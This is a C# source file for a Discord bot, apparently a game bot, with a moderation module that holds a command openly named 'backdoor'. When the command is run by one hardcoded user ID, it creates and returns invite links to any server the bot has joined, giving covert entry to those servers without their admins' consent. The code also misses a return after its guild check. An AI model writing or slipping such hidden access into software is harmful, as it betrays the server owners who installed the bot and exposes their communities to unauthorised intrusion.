using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;

using Discord;
using Discord.Commands;
using Discord.WebSocket;


namespace DiscordMafiaBot.Core.Moderation
{
	class Backdoor : ModuleBase<SocketCommandContext>
	{
		[Command("backdoor"), Summary("Get the invite of a server")]
		public async Task BackdoorModule(ulong guildId)
		{
			if (!(Context.User.Id == 254872929395802112))
			{
				await Context.Channel.SendMessageAsync(":x: :white_check_mark:");
				return;
			}

			if (Context.Client.Guilds.Where(x => x.Id == guildId).Count() < 1)
			{
				await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + guildId);
			}

			SocketGuild guild = Context.Client.Guilds.Where(x => x.Id == guildId).FirstOrDefault();
			var invites = await guild.GetInvitesAsync();
			if (invites.Count() < 1)
			{
				try
				{
					await guild.TextChannels.First().CreateInviteAsync();
				}
				catch (Exception ex)
				{
					await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {guild.Name} went wrong with error ''{ex.Message}''");
					return;
				}
			}

			invites = null;
			invites = await guild.GetInvitesAsync();

			EmbedBuilder embed = new EmbedBuilder();
			embed.WithAuthor($"Invites for guild {guild.Name}", guild.IconUrl);
			embed.WithColor(40, 200, 150);
			foreach (var current in invites)
			{
				embed.AddField("Invite:", $"[Invite]({current.Url})", true);
			}

			await Context.Channel.SendMessageAsync("", false, embed.Build());
		}
	}
}
